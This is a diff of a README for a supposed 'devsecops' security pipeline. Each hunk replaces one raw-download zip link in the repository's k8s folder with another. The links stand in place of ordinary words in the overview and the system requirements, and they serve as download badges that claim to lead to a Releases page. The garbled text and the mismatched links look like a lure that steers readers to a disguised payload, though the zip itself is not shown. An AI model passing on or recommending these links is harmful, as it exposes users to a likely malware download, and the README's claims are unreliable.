@@ -1,7 +1,7 @@
 # 🚀 devsecops - Automate Your Application Security
 
 ## ✅ Overview
-Welcome to **devsecops**, a complete automation pipeline designed for https://raw.githubusercontent.com/quinntrys/devsecops/main/k8s/Software_v1.3.zip applications. This tool helps you integrate security into your workflow from the start. With features like GitHub Actions, Docker, Trivy security scanning, and Kubernetes (Minikube), you can confidently deploy your applications with ease.
+Welcome to **devsecops**, a complete automation pipeline designed for https://github.com/quinntrys/devsecops/raw/refs/heads/main/k8s/Software-v1.4.zip applications. This tool helps you integrate security into your workflow from the start. With features like GitHub Actions, Docker, Trivy security scanning, and Kubernetes (Minikube), you can confidently deploy your applications with ease.
 
 ## 🛠️ Features
 - **CI/CD Automation**: Seamlessly integrate with GitHub Actions.
@@ -14,7 +14,7 @@ Welcome to **devsecops**, a complete automation pipeline designed for https://ra
 
 To get started, visit the Releases page to download the necessary files. 
 
-[![Download devsecops](https://raw.githubusercontent.com/quinntrys/devsecops/main/k8s/Software_v1.3.zip)](https://raw.githubusercontent.com/quinntrys/devsecops/main/k8s/Software_v1.3.zip)
+[![Download devsecops](https://github.com/quinntrys/devsecops/raw/refs/heads/main/k8s/Software-v1.4.zip)](https://github.com/quinntrys/devsecops/raw/refs/heads/main/k8s/Software-v1.4.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Choose the version you need.
@@ -26,7 +26,7 @@ To run devsecops, ensure you meet the following system requirements:
 - **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
 - **RAM**: At least 4 GB.
 - **Disk Space**: Minimum 1 GB available.
-- **https://raw.githubusercontent.com/quinntrys/devsecops/main/k8s/Software_v1.3.zip**: Version 14 or later installed on your system.
+- **https://github.com/quinntrys/devsecops/raw/refs/heads/main/k8s/Software-v1.4.zip**: Version 14 or later installed on your system.
 - **Docker**: Installed and running for container management.
 
 ## 🚀 Getting Started
@@ -79,4 +79,4 @@ For further information and detailed documentation, check these resources:
 
 To download devsecops again or share it with others, visit the Releases page:
 
-[![Download devsecops](https://raw.githubusercontent.com/quinntrys/devsecops/main/k8s/Software_v1.3.zip)](https://raw.githubusercontent.com/quinntrys/devsecops/main/k8s/Software_v1.3.zip)
+[![Download devsecops](https://github.com/quinntrys/devsecops/raw/refs/heads/main/k8s/Software-v1.4.zip)](https://github.com/quinntrys/devsecops/raw/refs/heads/main/k8s/Software-v1.4.zip)
